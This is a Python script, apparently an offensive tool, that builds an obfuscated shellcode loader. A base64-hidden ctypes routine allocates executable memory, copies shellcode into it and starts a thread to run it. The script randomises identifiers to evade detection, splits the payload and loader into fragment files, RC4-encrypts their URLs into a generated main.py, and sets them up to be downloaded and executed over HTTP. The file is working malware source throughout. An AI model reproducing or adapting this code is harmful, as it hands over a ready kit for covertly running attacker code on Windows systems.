import os
import time
from random import choice, randint, shuffle
from string import ascii_letters
from Crypto.Cipher import ARC4
from binascii import b2a_hex, a2b_hex, Error
import re
import base64

KeyWordList = b'''\
_0xFFFFFFF
_0x0000FFFA
_0x0000FFFB
_0x0000FFFF
_0x0000FFFE
_0x0000FFF0
_0x0000FFFD
_0x0000FFFC
_0x0000FFAD
_0xAAAAFFFF
_0xCCCCFFFF
_0xDDDDFFFF
_0x0000FFF0\
'''.decode('ascii').split('\n')

LOADER_TEMP = base64.b64decode('Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MucmVzdHlwZSA9IGN0eXBlcy5jX3VpbnQ2NDtwdHIgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYyhjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludChsZW4oXzB4MDAwMEZGRjApKSwgY3R5cGVzLmNfaW50KDB4MzAwMCksY3R5cGVzLmNfaW50KDB4NDApKTtidWYgPSBjdHlwZXMuQVJSQVkoY3R5cGVzLmNfY2hhciwgbGVuKF8weDAwMDBGRkYwKSkuZnJvbV9idWZmZXJfY29weShfMHgwMDAwRkZGMCk7Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX3VpbnQ2NChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oXzB4MDAwMEZGRjApKSk7aGFuZGxlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoY3R5cGVzLmNfaW50KDApLCBjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX3VpbnQ2NChwdHIpLGN0eXBlcy5jX2ludCgwKSxjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5wb2ludGVyKGN0eXBlcy5jX2ludCgwKSkpO2N0eXBlcy53aW5kbGwua2VybmVsMzIuV2FpdEZvclNpbmdsZU9iamVjdChjdHlwZXMuY19pbnQoaGFuZGxlKSwgY3R5cGVzLmNfaW50KC0xKSk7').decode('ascii')



class Any(object):
    @staticmethod
    def g():
        _s = ascii_letters
        s = [choice(_s) for _ in range(randint(17, 37))]
        [shuffle(s) for _ in range(9)]
        return ''.join(s).encode('ascii')

    @staticmethod
    def r(k, d):
        return b2a_hex(ARC4.new(k).encrypt(d))

    @staticmethod
    def d(k, d):
        try:
            return ARC4.new(k).decrypt(a2b_hex(d))
        except Error:
            return b''


class Write(object):
    def __init__(self, **kwargs):
        code = kwargs.get('code')
        path = kwargs.get('path')
        self.save_dir = kwargs.get('save_dir')
        if path and os.path.isfile(path):
            with open(path) as f:
                self._code = f.read().strip()
        elif code:
            self._code = code
        else:
            raise ValueError('请传入分隔的字符串或者其所在的文件路径！')

    def __str__(self):
        code = self._code
        code_len = len(code)
        r1 = randint(0, code_len)
        r2 = randint(0, code_len)
        while r1 == r2:
            r2 = randint(0, code_len)
        if r1 > r2:
            r1 = r1 ^ r2
            r2 = r1 ^ r2
            r1 = r1 ^ r2
        name = ''.join([choice(ascii_letters) for _ in range(0x0F)])
        i = 0
        for r in (code[: r1], code[r1: r2], code[r2:]):
            filename = os.path.join(self.save_dir, '%s.%s' % (name, i))
            with open(filename, 'w', encoding='utf8') as f:
                f.write(r)
            i += 1
        return name


def make_result(base_url):

    key = Any.g()
    k8 = 'EXP_%s_%s' % (key[:8].decode('ascii'), int(time.time()))
    if not os.path.isdir(k8):
        os.mkdir(k8)
    with open('template/template.py', 'r', encoding='utf8') as ft:
        result = ft.read()
        global LOADER_TEMP
        for kw in KeyWordList:
            r = '_%s' % Any.g().decode('ascii')[:8]
            if kw == '_0x0000FFF0':
                LOADER_TEMP = re.sub(r'%s' % kw, r, LOADER_TEMP)
            result = re.sub(r'%s' % kw, r, result)
        main_py = result
    payload_name = str(Write(save_dir=k8, path='template/payload.txt'))
    loader_name = str(Write(save_dir=k8, code=base64.b64encode(LOADER_TEMP.encode('ascii')).decode('ascii')))
    payload_addr = ('%s/%s' % (base_url, payload_name)).encode('ascii')
    loader_addr = ('%s/%s' % (base_url, loader_name)).encode('ascii')
    main_py = main_py.format(
        DUMP_KEY=key.decode('ascii'),
        PAYLOAD_ADDR=Any.r(key, payload_addr).decode('ascii'),
        LOADER_ADDR=Any.r(key, loader_addr).decode('ascii')
    )
    with open(os.path.join(k8, 'main.py'), 'w', encoding='utf8') as fw:
        fw.write(main_py)
    # os.system('cd %s && python -m http.server %s' % (k8, '8899'))


if __name__ == '__main__':
    make_result('http://127.0.0.1:8899')

